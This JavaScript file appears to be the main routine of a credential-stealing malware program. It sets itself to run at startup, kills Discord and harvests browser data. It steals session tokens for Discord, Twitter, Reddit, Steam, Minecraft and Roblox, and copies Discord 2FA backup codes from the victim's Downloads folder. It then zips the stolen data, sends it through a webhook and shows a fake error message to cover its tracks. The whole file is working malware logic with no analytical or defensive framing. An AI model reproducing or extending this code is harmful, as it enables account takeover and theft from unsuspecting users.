const config = require('../config');
const { runningFromExecutable, sleep, runningFromStartup } = require('./general');
const { join, sep } = require('path');
const os = require('os');
const { copyFileSync, existsSync, mkdtempSync } = require('fs');

let tempFolder = '';

function createTempFolder() {
  tempFolder = mkdtempSync(join(os.tmpdir(), sep), 'utf8');

  return tempFolder;
}

const getTempFolder = function() {
  return tempFolder;
};

module.exports = async () => {
  module.exports.getTempFolder = getTempFolder;
  const tempFolder = createTempFolder();

  if (config.addToStartup && runningFromExecutable()) require('../functions/startup');
  if (config.discord.killProcess) require('../functions/kill-discord');
  await require('../functions/grab-browsers-data');

  if (config.sessionStealing) {
    const { twitter, reddit, steam, minecraft } = require('../functions/steal-sessions');
    if (config.sessionStealing.discord) await require('../functions/grab-discord-token');
    if (config.sessionStealing.twitter) await twitter();
    if (config.sessionStealing.reddit) await reddit();
    if (config.sessionStealing.steam) await steam();
    if (config.sessionStealing.minecraft) await minecraft();
    if (config.sessionStealing.roblox) await require('../functions/grab-roblox')();
  }

  const mfaCodesPath = join(os.homedir(), 'Downloads', 'discord_backup_codes.txt');
  if (existsSync(mfaCodesPath)) {
    copyFileSync(mfaCodesPath, join(tempFolder, 'Discord 2FA Backup Codes.txt'));
  }
  await sleep(500);
  require('../functions/zip').then(await (require('../functions/webhook')));

  if (config.fakeError && !runningFromStartup()) require('../functions/fake-error');
};
